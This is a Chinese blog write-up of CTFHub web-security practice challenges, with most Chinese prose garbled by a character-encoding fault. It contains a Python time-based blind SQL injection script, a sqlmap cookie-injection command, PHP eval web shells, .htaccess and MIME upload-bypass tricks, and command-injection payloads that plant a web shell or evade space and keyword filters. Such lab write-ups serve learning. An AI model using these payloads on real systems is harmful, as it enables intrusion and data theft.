æŒ‰å‡ºé¢˜äººå°¿æ€§éƒ½æ˜¯ sqli ç„¶å åŒ¹é…ä¸€ä¸‹ s çœ‹çœ‹ å†åŒ¹é… a å¯¹æ¯”ä¸€ä¸‹\nç”¨æˆ‘è¹©è„šçš„python(æˆ‘é¶æœºç»­è´¹ä¸¤æ¬¡çš„åŸå› ä¹‹ä¸€,,,,,,,QWQ) å†™æ³¢è„šæœ¬è·‘ä¸€ä¸‹\nç„¶åå®Œå–„è„šæœ¬æŠŠ æ•°æ®è¡¨ å­—æ®µå’Œflagéƒ½è·‘å‡ºæ¥ è„šæœ¬å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #å†™è„šæœ¬æ°´å¹³å¾ˆä½ å¤§ç¥ä¸è¦å–·å“ˆ #ä½¿ç”¨çš„è¯åªè¦ç¨å¾®æ”¹å‡ ä¸ªå‚æ•°å°±è¡Œäº† import requests import time url = \u0026#34;http://challenge-9514b2cf659c25a1.sandbox.ctfhub.com:10080/?id=\u0026#34; des = \u0026#34;\u0026#34; for k in range(0,1): print(k) for i in range(1,60): for j in \u0026#39;abcdefghijklmnopqrstuvwxyz}{0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;: # æ•°æ®åº“ # sql = \u0026#34;if(substr(database(),%d,1)=\u0026#39;%s\u0026#39;,sleep(1),1) #\u0026#34; %(i,j) # æ•°æ®è¡¨ # sql = \u0026#34;if(substr((select table_name from information_schema.tables where table_schema=\u0026#39;sqli\u0026#39; limit %d,1),%d,1) = \u0026#39;%s\u0026#39;,sleep(1),1)\u0026#34; %(k,i,j) # å­—æ®µ # sql = \u0026#34;if(substr((select column_name from information_schema.columns where table_name=\u0026#39;flag\u0026#39; and table_schema=\u0026#39;sqli\u0026#39;),%d,1) = \u0026#39;%s\u0026#39;,sleep(1),1)\u0026#34; %(i,j) # å­—æ®µå†…å®¹ sql = \u0026#34;if(substr((select flag from sqli.flag),%d,1) = \u0026#39;%s\u0026#39;,sleep(1),1)\u0026#34; %(i,j) t1 = time.time() r = requests.get(url+sql) t2 = time.time() if(t2-t1 \u0026gt; 1): des += j print(des) break print(\u0026#34;des:\u0026#34; + des) des = \u0026#34;\u0026#34; MySQLç»“æ„ å°±æ˜¯æ™®é€šæ‰‹æ³¨å°±è¡Œ\u0026hellip;\u0026hellip;.ä¸ºå•¥å®ƒæ”¾è¿™ä¹ˆä¸‹é¢\u0026hellip;\u0026hellip;.ä¸æƒ³å†™äº†\nç®—äº† sqlmap è·‘ä¸€æ³¢å§ è¿™ä¹ˆå¤šé¢˜è¿˜æ²¡è·‘è¿‡ sqlmap å‘¢ ç»“æœ sqlmap è·‘è¿˜æ²¡æ‰‹æ³¨å¿«\u0026hellip;..çœŸå®\u0026hellip;\u0026hellip;\nCookieæ³¨å…¥ æŠ“åŒ…cookieåé¢ idåæœ‰ä¸€ä¸²ä¸œè¥¿åƒurlç¼–ç  ä½†æ˜¯è§£å‡ºæ¥ä¹±ç  ç›´æ¥æ”¹ id=1 è¯•è¯•\næ‰‹æ³¨å‘ç°æœ‰ä¸¤å¤„å›æ˜¾ æ— ä»»ä½•ç»•è¿‡\næ³¨å¾—æ•°æ®åº“ç»“æ„\nsqli news id 1,2,114514 data ctfhub,skill,sqli nooslnmxuf vuhgcinlvb ctfhub{8283144bd2b701f08311ac069af61fabdf227936}\\ sqlmapä¹Ÿèƒ½è·‘å‡ºæ¥\npython sqlmap.py -u \u0026ldquo;http://challenge-192a33ee430cafd7.sandbox.ctfhub.com:10080/\u0026quot; \u0026ndash;cookie \u0026ldquo;id=1\u0026rdquo; \u0026ndash;dbs\nUAæ³¨å…¥ UAæ³¨å…¥ä»‹ç»\nä¾ç„¶æ‰‹æ³¨ ä¾ç„¶æ— ä»»ä½•ç»•è¿‡ ä¾ç„¶ä¸¤ä¸ªå›æ˜¾\næ³¨å¾—æ•°æ®åº“ç»“æ„\nsqli news id 1,2,114514 data ctfhub,skill,sqli rnarxnqskp ahlzriucqp ctfhub{df17b7f5fff86cb0176e077e0231c5ce567fb3ac} Referæ³¨å…¥ æˆ‘è§‰å¾—è¿˜æ˜¯ä¸€æ¨¡ä¸€æ ·çš„å¥—è·¯ ä¸æƒ³å†™äº†\u0026hellip;\u0026hellip;.å”¯ä¸€è¦æ³¨æ„çš„å°±æ˜¯referå¤´è¦è‡ªå·±åŠ \nipploqowdc\nozknttspso\nctfhub{5cca896d0b05a1eb8977197827b33b57df87aacb}\næ–‡ä»¶ä¸Šä¼  æ— éªŒè¯ ä¼ ä¸ªé©¬ä¸Šå»\nèšå‰‘è¿ä¸Šå»\næ‰¾åˆ°flag\nå‰ç«¯éªŒè¯ phpæ”¹åå­—å‰ç«¯ä¸Šä¼  æŠ“åŒ…æ”¹å›php ä¸€æ ·çš„æ“ä½œè¿èšå‰‘ å–flag\n.htaccess htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½\nç®€å•æ¥è¯´å°±æ˜¯æ“æ§æœåŠ¡å™¨è®©ä»–å…è®¸ä½ åšäº‹\nç™¾åº¦ç™¾ç§‘é“¾æ¥\n.htaccess åˆ©ç”¨æ–¹æ³• å‚è€ƒåšæ–‡\næ³•ä¸€\n# FileMatch å‚æ•°å³ä¸ºæ–‡ä»¶åçš„æ­£åˆ™åŒ¹é…\r\u0026lt;FilesMatch \u0026#34;sniperoj\u0026#34;\u0026gt;\rSetHandler application/x-httpd-php\r\u0026lt;/FilesMatch\u0026gt; 1 \u0026lt;?php eval($_GET[\u0026#39;c\u0026#39;]);?\u0026gt; æ³•äºŒ\nAddType application/x-httpd-php .jpg 1 \u0026lt;?php @eval($_GET[\u0026#39;ma\u0026#39;]);?\u0026gt; å†™ä¸ª .htaccess æ–‡ä»¶ å†™ä¸ª é©¬ åç¼€æ”¹ jpg(ä½ å…è®¸çš„åç¼€) ç„¶åä¸Šä¼ èšå‰‘è¿ä¸€ä¸‹å°±è¡Œäº†\nMIMEç»•è¿‡ MIME:å®¢æˆ·ç«¯è½¯ä»¶ï¼ŒåŒºåˆ†ä¸åŒç§ç±»çš„æ•°æ®ï¼Œä¾‹å¦‚webæµè§ˆå™¨å°±æ˜¯é€šè¿‡MIMEç±»å‹æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯GIFå›¾ç‰‡ï¼Œè¿˜æ˜¯å¯æ‰“å°çš„PostScriptæ–‡ä»¶ã€‚webæœåŠ¡å™¨ä½¿ç”¨MIMEæ¥è¯´æ˜å‘é€æ•°æ®çš„ç§ç±»ï¼Œ webå®¢æˆ·ç«¯ä½¿ç”¨MIMEæ¥è¯´æ˜å¸Œæœ›æ¥æ”¶åˆ°çš„æ•°æ®ç§ç±»ã€‚\nç®€å•æ¥è¯´å°±æ˜¯ä» http æŠ¥æ–‡åˆ¤æ–­ä¸€ä¸‹ä½ ä¸Šä¼ çš„æ–‡ä»¶çš„ç±»å‹\nå†™ä¸ªé©¬ Content-Type å­—æ®µä¸­çš„å€¼æ”¹æˆ image/gif å°±è¡Œäº† ç„¶åè¿èšå‰‘æ‹¿flag\næ–‡ä»¶å¤´æ£€æŸ¥ ç”»å›¾è½¯ä»¶éšä¾¿å¼„ä¸ªå›¾ æŠ“åŒ…æœ€ååŠ ä¸Šé©¬ ç„¶åæ”¹å php èšå‰‘è¿ä¸Šå°±è¡Œ\n00æˆªæ–­ 00æˆªæ–­åŸç† 0x00æ˜¯å­—ç¬¦ä¸²çš„ç»“æŸæ ‡è¯†ç¬¦ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰‹åŠ¨æ·»åŠ å­—ç¬¦ä¸²æ ‡è¯†ç¬¦çš„æ–¹å¼æ¥å°†åé¢çš„å†…å®¹è¿›è¡Œæˆªæ–­ï¼Œè€Œåé¢çš„å†…å®¹åˆå¯ä»¥å¸®åŠ©æˆ‘ä»¬ç»•è¿‡æ£€æµ‹ã€‚\n00æˆªæ–­çš„é™åˆ¶æ¡ä»¶ PHP\u0026lt;5.3.29ï¼Œä¸”GPCå…³é—­ ä¼ ä¸ªæ™®é€šçš„ temp.php é©¬ä¸Šå»æŠ“åŒ…\nä¿®æ”¹çš„åœ°æ–¹å¯ä»¥æœ‰ä¸¤ä¸ª 1.ä¸Šé¢åœ°å€ 2.ä¸‹é¢æ–‡ä»¶å è¿™é‡Œå»ºè®®æ”¹ä¸Šé¢çš„ åŸå› \næˆ‘ä¸‹é¢æ–‡ä»¶ temp.php æ”¹æˆ temp.jpg ä¸ç„¶æ²¡æ³•ä¸Šä¼ \nä¸Šé¢çš„åœ°å€æ”¹çš„æ˜¯ ma.php æ‰€ä»¥è¿çš„æ—¶å€™è¿ ma.php\nè¿™æ ·æ›´å®¹æ˜“ç†è§£å§\nåŒå†™åç¼€ è¿™å°±ä¸ç”¨å¤šè®²äº†å§ é¢˜ç›®éƒ½å‘Šè¯‰ä½ æ€ä¹ˆåšäº† åŒå†™åç¼€å°±è¡Œ ä¸è¿‡è¿™ä¸ªå‘½åç¨å¾®æœ‰ç‚¹è®²ç©¶ ç¨å¾®æ³¨æ„ä¸‹å°±è¡Œ\nRCE å‘½ä»¤æ³¨å…¥ å¯ä»¥å…ˆè¯•ä¸€ä¸‹ ping 127.0.0.1 ç„¶å åˆ—ä¸€ä¸‹ç›®å½•\n127.0.0.1 \u0026amp; ls\nå¯ä»¥çœ‹åˆ°ä¸€ä¸ªçº¯æ•°å­—çš„ phpæ–‡ä»¶ é‡Œé¢ç»å¯¹å°±æ˜¯flag æœ€åé‚£ä¸ª ma.php æ˜¯æˆ‘åæ¥ä¼ çš„\nå°è¯•catä¸€ä¸‹é‚£ä¸ªæ–‡ä»¶ å‘ç°è¢«å±è”½äº† more tac ç­‰å‘½ä»¤å…¨éƒ½è¢«å±è”½äº† é‚£ä¹ˆé—®é¢˜æ¥äº† è¿™é¢˜è·Ÿç¬¬äºŒé¢˜ å±è”½cat æœ‰ä»€ä¹ˆåŒºåˆ«\nå¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œ ç›´æ¥é‡å®šå‘ä¸ªé©¬ä¸Šå» ç”¨èšå‰‘è¿å°±å¯ä»¥äº†\n127.0.0.1 \u0026amp; echo \u0026ldquo;\u0026lt;?php @eval($_POST[\u0026lsquo;ma\u0026rsquo;]);\u0026rdquo; \u0026gt; ma.php\né‡å®šå‘ï¼šç®€å•æ¥è¯´å°±æ˜¯å‘½ä»¤è¡Œçš„è¾“å…¥å’Œè¾“å‡ºæ¢ä¸ªåœ°æ–¹è¾“å…¥æˆ–è€…è¾“å‡º å¯ä»¥ç›´æ¥å¾€æ–‡ä»¶è¾“å‡ºã€‚\nè¿‡æ»¤cat è·Ÿä¸Šä¸€é¢˜å®Œå…¨ä¸€æ · ä¸èµ˜è¿°\nè¿‡æ»¤ç©ºæ ¼ è¿‡æ»¤ç©ºæ ¼æ–¹æ³•\n{cat,flag.txt} cat${IFS}flag.txt\rcat$IFS$9flag.txt\rcat\u0026lt;flag.txt\rcat\u0026lt;\u0026gt;flag.txt\rkg=$\u0026#39;\\x20flag.txt\u0026#39;\u0026amp;\u0026amp;cat$kg\r(\\x20è½¬æ¢æˆå­—ç¬¦ä¸²å°±æ˜¯ç©ºæ ¼ï¼Œè¿™é‡Œé€šè¿‡å˜é‡çš„æ–¹å¼å·§å¦™ç»•è¿‡) è¿™é“é¢˜ç›®å·®ç‚¹è®©æˆ‘è‡ªé—­\n1 2 3 4 5 #åˆ—ä¸€ä¸‹ç›®å½• #è¿™é‡Œ\u0026amp;\u0026amp; å’Œ || éƒ½å¯ä»¥ ç…§ç†è¯´ || æ˜¯ä¸è¡Œçš„ åº”è¯¥ç”¨ \u0026amp;\u0026amp; 127.0.0.1||ls #catä¸€ä¸‹ flagxxxx.php 127.0.0.1||cat\u0026lt;flagxxxx.php ç„¶åæˆ‘ä¸€ç›´è‡ªé—­åœ¨è¿™é‡Œæ˜æ˜æ²¡æœ‰ç©ºæ ¼ ä»–ä¹Ÿæ­£å¸¸æ‰§è¡Œäº† ä¸ºä»€ä¹ˆè¿”å›ä¸€ä¸ªç©ºè¡Œå‘¢\nåå¤å°è¯•äº†æ— æ•°éåæˆ‘æ— å¥ˆåœ°æ‰“å¼€wpä½†æ˜¯å‘ç°wpè·Ÿæˆ‘ä¸€æ ·QWQ åŸåœ°è£‚å¼€æ›´åŠ æ€€ç–‘äººç”Ÿ\næœ€åé¶æœºè¿˜æœ‰ 30s çš„æ—¶å€™(ä¸€å®šè¦çœ‹æºç ï¼ï¼ï¼)\nè¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦ åˆ—ä¸€ä¸‹ç›®å½•\n127.0.0.1 || ls\nåˆ—ä¸€ä¸‹ flagç›®å½•\n127.0.0.1 || ls flag_is_here\nåªæœ‰ä¸€ä¸ª flag.php\nåˆ‡æ¢åˆ° flag ç›®å½•å†cat flag.php\n127.0.0.1 || cd flag_is_here\u0026amp;\u0026amp;cat flag_40921853324810.php\nè¿‡æ»¤è¿ç®—ç¬¦ åˆ—ç›®å½• åˆ†å·ç±»ç±»ä¼¼äºå¾ˆå¤šç¼–ç¨‹è¯­è¨€çš„åˆ†å· æ‰€ä»¥ç†è®ºä¸Šä½ çš„æ‰€æœ‰ php éƒ½å¯ä»¥å†™åœ¨ä¸€è¡Œé‡Œ\n;ls\nç„¶å cat ä¸€ä¸‹flagå°±å¯ä»¥äº† æ„Ÿè§‰è¿™é¢˜æ¯”å‰é¢å‡ é¢˜éƒ½ç®€å•ä¸€äº›\nç»¼åˆç»ƒä¹  é¦–å…ˆå°è¯•äº†ä¸‹æŠŠåˆ†å·urlç¼–ç  ä¸è¿‡æ˜¯æ²¡ç”¨çš„ æ¢è¡Œç¬¦ url ç¼–ç  %0a\nè¦ç›´æ¥åœ¨åœ°å€æ è¾“å…¥ä¸ç„¶ % ä¼šè¢«è½¬æˆurlç¼–ç  %25 æˆ‘è¿™é‡Œåªæ˜¯æ¼”ç¤º\n1 %0Als${IFS}$(printf${IFS}%22\\x66\\x6C\\x61\\x67\\x5F\\x69\\x73\\x5F\\x68\\x65\\x72\\x65%22) è¿™ä¹ˆé•¿è¦ä¸€ä¸ªä¸€ä¸ªè½¬åŒ–ä¸ºåå…­è¿›åˆ¶ ç„¶åæ‰‹å·®ç‚¹æ–­æ‰ã€‚ã€‚ã€‚\n1 %0Aca%27%27t${IFS}$(printf${IFS}\u0026#34;\\x66\\x6c\\x61\\x67\\x5f\\x69\\x73\\x5f\\x68\\x65\\x72\\x65\\x2f\\x66\\x6c\\x61\\x67\\x5f\\x33\\x32\\x31\\x30\\x38\\x36\\x39\\x39\\x31\\x33\\x30\\x34\\x30\\x32\\x2e\\x70\\x68\\x70\u0026#34;) ä¸Šé¢çš„å…¨éƒ¨åŸç†éƒ½åœ¨ä¸‹é¢è¿™å¼ å›¾ä¸­\n","description":"","id":38,"section":"posts","tags":["CTF","WP"],"title":"ctfhub writeup","uri":"https://ruokeqx.gitee.io/posts/ctfhub_wp/"}]